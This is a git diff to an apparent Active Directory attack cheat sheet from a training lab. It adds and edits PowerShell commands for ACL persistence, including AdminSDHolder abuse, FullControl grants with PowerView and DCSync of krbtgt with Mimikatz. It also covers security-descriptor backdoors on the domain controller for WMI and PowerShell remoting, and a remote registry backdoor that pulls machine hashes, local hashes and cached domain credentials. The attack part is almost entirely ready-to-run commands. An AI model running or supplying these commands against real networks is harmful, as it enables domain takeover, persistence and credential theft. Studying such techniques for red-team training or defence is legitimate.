@@ -106,6 +106,7 @@ Then, All local logons on the DC are logged to
 **C:\Windows\system32\kiwissp.log**
 
 ## ACL
+> All ACL attack need DA right
 ### AdminSDHolder
 > AdminSDHolder - Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL. 
 
@@ -169,7 +170,7 @@ Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Pas
 Add FullControl rights
 ```powershell
 #Using PowerView:
-Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student1 -Rights All -Verbose 
+Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student134 -Rights All -Verbose 
 
 #Using ActiveDirectory Module and Set-ADACL:
 Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -Verbose
@@ -186,3 +187,66 @@ Execute DCSync:
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
+
+### Security Descriptor
+> config security descriptor so we can access (with WMI or powershell) and execute command on DC
+#### WMI
+ACLs can be modified to allow non-admin users access to securable objects.
+On the attacker machine
+```powershell
+. C:\AD\Tools\RACE.ps1
+Set-RemoteWMI -SamAccountName student1 -Verbose
+```
+ On remote machine
+ ```powershell
+ . C:\AD\Tools\RACE.ps1
+ Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+ ```
+On remote machine with explicit credentials. Only root\cimv2 and nested namespaces
+  ```powershell
+ . C:\AD\Tools\RACE.ps1
+Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose
+ ```
+
+On remote machine remove permissions:
+  ```powershell
+. C:\AD\Tools\RACE.ps1
+Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Remove -Verbose
+ ```
+
+ #### PowerShell Remoting
+ > using RACE.ps1
+
+On attacker machine:
+```powershell
+Set-RemotePSRemoting -SamAccountName attacker_username -Verbose
+ ```
+On remote/victim machine for student1 without credentials:
+> note that after changing the ACL the session will be terminate
+```powershell
+Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose
+ ```
+On remote machine, remove the permissions:
+```powershell
+Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove
+ ```
+
+ #### Remote Registry
+> using RACE.ps1
+
+Using DAMP, with admin privs on remote machine
+```powershell
+Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
+ ```
+As student1(local), retrieve machine account hash:
+```powershell
+Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
+ ```
+Retrieve local account hash:
+```powershell
+Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
+ ```
+Retrieve domain cached credentials:
+```powershell
+Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
+ ```
